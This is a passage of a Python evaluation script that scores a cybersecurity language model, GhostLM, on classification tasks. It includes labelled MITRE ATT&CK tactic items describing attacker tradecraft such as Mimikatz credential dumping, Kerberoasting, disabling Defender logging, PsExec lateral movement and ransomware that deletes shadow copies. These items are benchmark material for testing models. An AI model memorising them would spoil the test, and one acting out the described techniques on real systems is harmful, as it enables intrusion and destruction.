            "and even after most cleanup attempts."
        ),
        "label": "Persistence",
    },
    {
        "description": (
            "On the compromised macOS laptop, the operator dropped a LaunchAgent plist into "
            "~/Library/LaunchAgents/ that referenced their backdoor binary. The agent was set "
            "to run-at-load, guaranteeing the backdoor reactivated every time the user logged "
            "into their account."
        ),
        "label": "Persistence",
    },
    {
        "description": (
            "After landing as a low-privilege user, the operator ran a Linux kernel exploit for "
            "an unpatched local CVE. The exploit returned a root shell, jumping the attacker "
            "from a constrained user account into full administrative control of the host."
        ),
        "label": "Privilege Escalation",
    },
    {
        "description": (
            "The implant abused a misconfigured service whose binary path was writable by all "
            "users. Replacing the binary and restarting the service caused Windows to launch "
            "the attacker's payload as LocalSystem, escalating from the standard user context "
            "in which the implant had been dropped."
        ),
        "label": "Privilege Escalation",
    },
    {
        "description": (
            "Before staging tooling, the operator added a process-exclusion path to Microsoft "
            "Defender for the directory their dropper would use. They also cleared the Windows "
            "PowerShell event log and disabled Script Block Logging, all aimed at keeping their "
            "subsequent activity invisible to defenders."
        ),
        "label": "Defense Evasion",
    },
    {
        "description": (
            "The malware injected its payload into the address space of a legitimate "
            "explorer.exe process using a process-hollowing technique. From defenders' "
            "perspective, only a normal Windows shell process appeared running; the malicious "
            "code ran inside it without spawning any new suspicious processes."
        ),
        "label": "Defense Evasion",
    },
    {
        "description": (
            "Holding SYSTEM on a domain-joined host, the operator used Mimikatz to dump "
            "credentials and Kerberos tickets from the LSASS process memory. The harvested "
            "material gave them a pool of usernames, NTLM hashes, and TGTs to authenticate as "
            "across the broader enterprise network."
        ),
        "label": "Credential Access",
    },
    {
        "description": (
            "The adversary requested a Kerberos service ticket for a service principal name "
            "linked to a high-value account, then pulled the encrypted ticket offline and "
            "brute-forced its password using hashcat. This Kerberoasting yielded the cleartext "
            "service-account password without alerting the domain controller."
        ),
        "label": "Credential Access",
    },
    {
        "description": (
            "After establishing access, the operator ran net group \"Domain Admins\" /domain "
            "and reviewed Active Directory for trust relationships, group memberships, and "
            "high-value hosts. The information gathered fed their plan for which systems to "
            "target next as they expanded inside the network."
        ),
        "label": "Discovery",
    },
    {
        "description": (
            "On the freshly compromised Linux server, the operator listed running processes, "
            "open network sockets, and scheduled cron jobs. They also enumerated environment "
            "variables for any embedded credentials or configuration that might point them at "
            "additional services to attack."
        ),
        "label": "Discovery",
    },
    {
        "description": (
            "Holding a captured domain-admin password, the operator used PsExec to drop and "
            "start a service binary on a list of file servers. Each new host was now reachable "
            "from their command-and-control framework, extending the compromise across the "
            "estate one server at a time."
        ),
        "label": "Lateral Movement",
    },
    {
        "description": (
            "After harvesting RDP credentials from a workstation, the operator opened RDP "
            "sessions to neighboring developer machines and dropped their toolkit there. The "
            "approach blended in with normal helpdesk activity and let the operator reach hosts "
            "that did not run their original implant."
        ),
        "label": "Lateral Movement",
    },
    {
        "description": (
            "The malware enumerated the user's Documents and Desktop folders for files matching "
            "*.docx, *.pdf, and *.xlsx, copied them into a hidden staging directory, and "
            "compressed them into a password-protected RAR archive ready for exfiltration."
        ),
        "label": "Collection",
    },
    {
        "description": (
            "The implant captured 30-second audio clips from the laptop's microphone every "
            "two hours and saved them to %TEMP% with timestamped filenames. It also took "
            "periodic screenshots of the desktop and stored them alongside the audio for the "
            "next exfiltration window."
        ),
        "label": "Collection",
    },
    {
        "description": (
            "The implant established an HTTPS connection to a CloudFront-fronted callback URL "
            "and polled it for tasking every five minutes. Operator commands were retrieved as "
            "JSON blobs and executed locally; output was returned in subsequent POST requests "
            "to the same domain."
        ),
        "label": "Command and Control",
    },
    {
        "description": (
            "To survive proxy filtering, the malware tunneled its operator commands as "
            "fields inside DNS TXT queries to attacker-controlled subdomains. The encrypted "
            "channel relied on DNS being permitted out of the network and gave the operators "
            "interactive control of the implant from anywhere on the internet."
        ),
        "label": "Command and Control",
    },
    {
        "description": (
            "After staging the collected archive, the implant uploaded it to a Mega.nz account "
            "controlled by the operator over plain HTTPS. The destination was chosen because "
            "the corporate proxy already trusted Mega's domain, allowing the multi-gigabyte "
            "transfer to complete without triggering DLP rules."
        ),
        "label": "Exfiltration",
    },
    {
        "description": (
            "Stolen documents were chunked, AES-encrypted, and posted to the body of HTTPS "
            "requests to /api/telemetry on an attacker-controlled CDN. The same channel had "
            "previously been used for command-and-control, but this transfer specifically "
            "moved data out of the victim network."
        ),
        "label": "Exfiltration",
    },
    {
        "description": (
            "Once exfiltration completed, the operator deployed a ransomware binary that "
            "enumerated network drives, encrypted documents using AES-256, and dropped a ransom "
            "note in every directory. Volume Shadow Copies were deleted to make local recovery "
            "infeasible."
        ),
        "label": "Impact",
    },
    {
        "description": (
            "Following the breach, the actor used a wiper that overwrote the master boot "
            "record on every reachable workstation with random bytes, rendering them unbootable. "
            "The action was timed to coincide with a press release, maximizing operational "
            "disruption to the victim organization."
        ),
        "label": "Impact",
    },
    {
        "description": (
            "Holding cloud-admin keys, the operator deleted production S3 buckets and the most "
            "recent cross-region snapshots before triggering shutdown of the customer-facing "
            "API. The destructive sequence was clearly the objective rather than a side effect "
            "of intrusion."
        ),
        "label": "Impact",
    },
]


# ---------------------------------------------------------------------------
# Scoring engine
# ---------------------------------------------------------------------------

SEVERITY_LEVELS = ["Critical", "High", "Medium", "Low"]
# Labels are sourced from the sample lists deduplicated in declaration order.
# Some tasks have multiple samples per label (Vuln Type, Attack Technique,
# CTF Category, MITRE Tactic) so dict-key ordering gives us a stable label
# list without duplicates.
VULN_TYPES = list(dict.fromkeys(s["label"] for s in VULN_TYPE_SAMPLES))
ATTACK_TECHNIQUES = list(dict.fromkeys(s["label"] for s in ATTACK_TECHNIQUE_SAMPLES))
CTF_CATEGORIES = list(dict.fromkeys(s["label"] for s in CTF_CATEGORY_SAMPLES))
MITRE_TACTICS = list(dict.fromkeys(s["label"] for s in MITRE_TACTIC_SAMPLES))


def load_model(checkpoint_path: str, device: str) -> Tuple[GhostLM, GhostLMConfig]:
    """Load a GhostLM model from checkpoint.

    Args:
        checkpoint_path: Path to the .pt checkpoint file.
        device: Target device string.

    Returns:
        Tuple of (model in eval mode, config).
    """
    checkpoint = torch.load(checkpoint_path, map_location=device, weights_only=False)
    saved_config = checkpoint["config"]
    config = GhostLMConfig(**{
        f.name: saved_config[f.name]
        for f in fields(GhostLMConfig)
        if f.name in saved_config
    })
    model = GhostLM(config)
    model.load_state_dict(checkpoint["model_state_dict"])
    model.eval()
    model = model.to(device)
    return model, config


def score_candidate(
    model: GhostLM,
    tokenizer: GhostTokenizer,
    prompt_ids: List[int],
    candidate: str,
    device: str,
    context_length: int,
    aggregate: str = "mean",
) -> float:
    """Compute log-probability of a candidate completion given a prompt.

    Concatenates the prompt token IDs with the candidate token IDs, runs the
    model forward pass, and aggregates the log-probabilities over the
    candidate token positions only.

    Args:
        model: GhostLM model in eval mode.
        tokenizer: GhostTokenizer instance.
        prompt_ids: Pre-encoded token IDs for the prompt.
        candidate: Candidate text string to score.
        device: Device string.
        context_length: Maximum sequence length for the model.
        aggregate: ``"mean"`` averages log-prob over candidate tokens
            (length-normalized; the historical default). ``"sum"`` returns
            the total log-prob and is the right choice for PMI scoring,
            where the same candidate is scored under two prompts of equal
            candidate length and length normalization would cancel out.

    Returns:
        Aggregated log-probability (higher is better, less negative).
    """
    cand_ids = tokenizer.encode(candidate)
    if not cand_ids:
        return float("-inf")

    full_ids = prompt_ids + cand_ids
    # Truncate from the left if too long, keeping the end (candidate) intact
    if len(full_ids) > context_length:
        full_ids = full_ids[-context_length:]
        cand_len = len(cand_ids)
    else:
        cand_len = len(cand_ids)

    input_ids = full_ids[:-1]
    target_ids = full_ids[1:]

    x = torch.tensor(input_ids, dtype=torch.long, device=device).unsqueeze(0)
    y = torch.tensor(target_ids, dtype=torch.long, device=device).unsqueeze(0)

    with torch.no_grad():
        logits, _ = model(x, targets=y)

    log_probs = torch.nn.functional.log_softmax(logits, dim=-1)

    start = max(0, len(target_ids) - cand_len)
    total_logp = 0.0
    count = 0
    for i in range(start, len(target_ids)):
        token_id = target_ids[i]
        total_logp += log_probs[0, i, token_id].item()
        count += 1

    if count == 0:
        return float("-inf")

    if aggregate == "sum":
        return total_logp
    return total_logp / count


def classify(
    model: GhostLM,
    tokenizer: GhostTokenizer,
    description: str,
    candidates: List[str],
    task_prompt: str,
    device: str,
    context_length: int,
    scoring: str = "pmi",
) -> Tuple[str, Dict[str, float]]:
    """Classify a description by scoring each candidate label.

    Two scoring modes:

    * ``"pmi"`` (default) — pointwise mutual information. Score is
      log P(candidate | task_prompt + description) - log P(candidate | task_prompt).
      Subtracting the task-prompt-only baseline cancels the model's
      unconditional prior toward common labels (the failure mode where
      the model picks "High" or "XSS" for every sample regardless of
      input). Both terms use ``aggregate="sum"`` so length normalization
      does not interfere.

    * ``"logp"`` — historical length-normalized log-probability of
      candidate given full prompt. Mode-collapses when one candidate's
      tokens are unconditionally more likely than the others, which is
      exactly what we observed across Phases 1-3 (4/30 = 13.3%, below
      the 15% random baseline).

    Args:
        model: GhostLM model in eval mode.
        tokenizer: GhostTokenizer instance.
        description: The text to classify.
        candidates: List of candidate label strings.
        task_prompt: Task-specific instruction prefix.
        device: Device string.
        context_length: Maximum sequence length for the model.
        scoring: ``"pmi"`` or ``"logp"``.

    Returns:
        ``(best_label, scores)`` — the winning label plus the per-candidate
        score dict (useful for debugging and per-sample inspection).
    """
    full_prompt = f"{task_prompt}\n\nDescription: {description}\n\nClassification:"
    full_ids = tokenizer.encode(full_prompt)

    baseline_ids = None
    if scoring == "pmi":
        baseline_prompt = f"{task_prompt}\n\nClassification:"
        baseline_ids = tokenizer.encode(baseline_prompt)

    aggregate = "sum" if scoring == "pmi" else "mean"

    scores: Dict[str, float] = {}
    for cand in candidates:
        cand_text = f" {cand}"
        conditional = score_candidate(
            model, tokenizer, full_ids, cand_text, device, context_length,
            aggregate=aggregate,
        )
        if scoring == "pmi":
            unconditional = score_candidate(
                model, tokenizer, baseline_ids, cand_text, device, context_length,
                aggregate=aggregate,
            )
            scores[cand] = conditional - unconditional
        else:
            scores[cand] = conditional

    best_label = max(scores.items(), key=lambda kv: kv[1])[0]
    return best_label, scores


def run_task(
    task_name: str,
    samples: List[Dict],
    candidates: List[str],
    task_prompt: str,
    model: GhostLM,
    tokenizer: GhostTokenizer,
    device: str,
    context_length: int,
    scoring: str = "pmi",
) -> Dict:
    """Run a classification task over a set of samples and return accuracy metrics."""
    correct = 0
    total = len(samples)
    details = []

    for sample in samples:
        predicted, scores = classify(
            model, tokenizer, sample["description"], candidates,
            task_prompt, device, context_length, scoring=scoring,
        )
        is_correct = predicted == sample["label"]
        if is_correct:
            correct += 1

        details.append({
            "expected": sample["label"],
            "predicted": predicted,
            "correct": is_correct,
            # Round for clean JSON without losing useful precision
            "scores": {k: round(v, 3) for k, v in scores.items()},
        })

    accuracy = correct / total if total > 0 else 0.0
    # Distribution check — flags mode-collapse, the failure mode that
    # killed the previous eval. If one label was predicted >70% of the
    # time the eval is not actually discriminating, regardless of
    # accuracy.
    pred_counts: Dict[str, int] = {}
    for d in details:
        pred_counts[d["predicted"]] = pred_counts.get(d["predicted"], 0) + 1
    most_common_share = max(pred_counts.values()) / total if total > 0 else 0.0

    return {
        "task": task_name,
        "correct": correct,
        "total": total,
        "accuracy": accuracy,
        "scoring": scoring,
        "prediction_distribution": pred_counts,
        "most_common_share": round(most_common_share, 3),
        "details": details,
    }


def print_scorecard(results: List[Dict], elapsed: float) -> None:
    """Print a formatted score card summarizing all evaluation tasks.

    Args:
        results: List of task result dicts from run_task.
        elapsed: Total evaluation time in seconds.
    """
    print("\n" + "=" * 60)
    print("GhostLM Cybersecurity Evaluation Score Card")
    print("=" * 60)
    print(f"{'Task':<40} {'Correct':>8} {'Total':>6} {'Accuracy':>10}")
    print("-" * 60)

    total_correct = 0
    total_samples = 0

    for r in results:
        print(f"{r['task']:<40} {r['correct']:>8} {r['total']:>6} {r['accuracy']:>9.1%}")
        total_correct += r["correct"]
        total_samples += r["total"]

    overall = total_correct / total_samples if total_samples > 0 else 0.0

    print("-" * 60)
    print(f"{'OVERALL':<40} {total_correct:>8} {total_samples:>6} {overall:>9.1%}")
    print("=" * 60)
    print(f"Time: {elapsed:.1f}s")
    print()

    # Print per-sample details
    for r in results:
        print(f"\n--- {r['task']} ---")
        for i, d in enumerate(r["details"]):
            status = "PASS" if d["correct"] else "FAIL"
            print(f"  [{status}] Expected: {d['expected']:<35} Predicted: {d['predicted']}")


def main():
    """Run the full cybersecurity evaluation suite against a GhostLM checkpoint.

    Evaluates three tasks: CVE severity classification, vulnerability type
    detection, and attack technique identification. Prints a score card and
    optionally saves results to JSON.
    """
    parser = argparse.ArgumentParser(
        description="Evaluate GhostLM on cybersecurity classification tasks"
    )
    parser.add_argument(
        "--checkpoint",
        type=str,
        default=None,
        help="Path to GhostLM checkpoint (uses random init if omitted)",
    )
    parser.add_argument(
        "--device",
        type=str,
        default="auto",
        help="Device to run on: auto, cpu, cuda, mps",
    )
    parser.add_argument(
        "--output",
        type=str,
        default="logs/eval_security.json",
        help="Where to save evaluation results",
    )
    parser.add_argument(
        "--scoring",
        type=str,
        choices=["pmi", "logp"],
        default="pmi",
        help=(
            "Candidate-scoring strategy. 'pmi' (default) subtracts the "
            "unconditional log-prob from the conditional log-prob — fixes "
            "the mode-collapse failure mode where the model picked the "
            "same label for every sample. 'logp' is the historical "
            "length-normalized scorer kept for back-compat / regression "
            "comparison."
        ),
    )
    args = parser.parse_args()

    # Resolve device
    if args.device == "auto":
        if torch.cuda.is_available():
            device = "cuda"
        elif hasattr(torch.backends, "mps") and torch.backends.mps.is_available():
            device = "mps"
        else:
            device = "cpu"
    else:
        device = args.device

    print("=" * 60)
    print("GhostLM Cybersecurity Evaluation")
    print("=" * 60)
    print(f"Device: {device}")

    t0 = time.time()

    # Load model
    if args.checkpoint and Path(args.checkpoint).exists():
        print(f"Loading model from {args.checkpoint}...")
        model, config = load_model(args.checkpoint, device)
    else:
        print("No checkpoint provided -- using random ghost-small init...")
        config = GhostLMConfig.from_preset("ghost-small")
        config.vocab_size = 50261
        model = GhostLM(config)
        model.eval()
        model = model.to(device)

    tokenizer = GhostTokenizer()
    context_length = config.context_length

    # Run evaluation tasks
    results = []

    print(f"Scoring: {args.scoring}")

    print("\n[1/5] CVE Severity Classification...")
    results.append(run_task(
        task_name="CVE Severity Classification",
        samples=CVE_SEVERITY_SAMPLES,
        candidates=SEVERITY_LEVELS,
        task_prompt=(
            "Classify the severity of the following security vulnerability as one of: "
            "Critical, High, Medium, or Low."
        ),
        model=model,
        tokenizer=tokenizer,
        device=device,
        context_length=context_length,
        scoring=args.scoring,
    ))

    r = results[-1]
    print(f"  Accuracy: {r['accuracy']:.1%}  (most-common-share: {r['most_common_share']:.0%})")

    print("\n[2/5] Vulnerability Type Detection...")
    results.append(run_task(
        task_name="Vulnerability Type Detection",
        samples=VULN_TYPE_SAMPLES,
        candidates=VULN_TYPES,
        task_prompt=(
            "Identify the type of security vulnerability described below. Choose from: "
            + ", ".join(VULN_TYPES) + "."
        ),
        model=model,
        tokenizer=tokenizer,
        device=device,
        context_length=context_length,
        scoring=args.scoring,
    ))

    r = results[-1]
    print(f"  Accuracy: {r['accuracy']:.1%}  (most-common-share: {r['most_common_share']:.0%})")

    print("\n[3/5] Attack Technique Identification...")
    results.append(run_task(
        task_name="Attack Technique Identification",
        samples=ATTACK_TECHNIQUE_SAMPLES,
        candidates=ATTACK_TECHNIQUES,
        task_prompt=(
            "Identify the attack technique being used in the following scenario. Choose from: "
            + ", ".join(ATTACK_TECHNIQUES) + "."
        ),
        model=model,
        tokenizer=tokenizer,
        device=device,
        context_length=context_length,
        scoring=args.scoring,
    ))

    r = results[-1]
    print(f"  Accuracy: {r['accuracy']:.1%}  (most-common-share: {r['most_common_share']:.0%})")

    print("\n[4/5] CTF Challenge Categorization...")
    results.append(run_task(
        task_name="CTF Challenge Categorization",
        samples=CTF_CATEGORY_SAMPLES,
        candidates=CTF_CATEGORIES,
        task_prompt=(
            "Identify the CTF challenge category for the description below. Choose from: "
            + ", ".join(CTF_CATEGORIES) + "."
        ),
        model=model,
        tokenizer=tokenizer,
        device=device,
        context_length=context_length,
        scoring=args.scoring,
    ))

    r = results[-1]
    print(f"  Accuracy: {r['accuracy']:.1%}  (most-common-share: {r['most_common_share']:.0%})")

    print("\n[5/5] MITRE ATT&CK Tactic Classification...")
    results.append(run_task(
        task_name="MITRE ATT&CK Tactic Classification",
        samples=MITRE_TACTIC_SAMPLES,
        candidates=MITRE_TACTICS,
        task_prompt=(
            "Identify the MITRE ATT&CK tactic (the adversary's high-level goal) for the "
            "behavior described below. Choose from: "
            + ", ".join(MITRE_TACTICS) + "."
        ),
        model=model,
        tokenizer=tokenizer,
        device=device,
        context_length=context_length,
        scoring=args.scoring,
    ))

    r = results[-1]
    print(f"  Accuracy: {r['accuracy']:.1%}  (most-common-share: {r['most_common_share']:.0%})")

    elapsed = time.time() - t0

    # Print score card
    print_scorecard(results, elapsed)

    # Save results
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    save_data = {
        "device": device,
        "checkpoint": args.checkpoint,
        "scoring": args.scoring,
        "elapsed_seconds": round(elapsed, 1),
        "tasks": [
            {
                "task": r["task"],
                "scoring": r["scoring"],
                "correct": r["correct"],
                "total": r["total"],
                "accuracy": round(r["accuracy"], 4),
                "prediction_distribution": r["prediction_distribution"],
                "most_common_share": r["most_common_share"],
                "details": r["details"],
            }
            for r in results
        ],
        "overall_accuracy": round(
            sum(r["correct"] for r in results) / sum(r["total"] for r in results), 4
        ),
    }

    with open(output_path, "w") as f:
        json.dump(save_data, f, indent=2)

    print(f"Results saved to {output_path}")


if __name__ == "__main__":
    main()
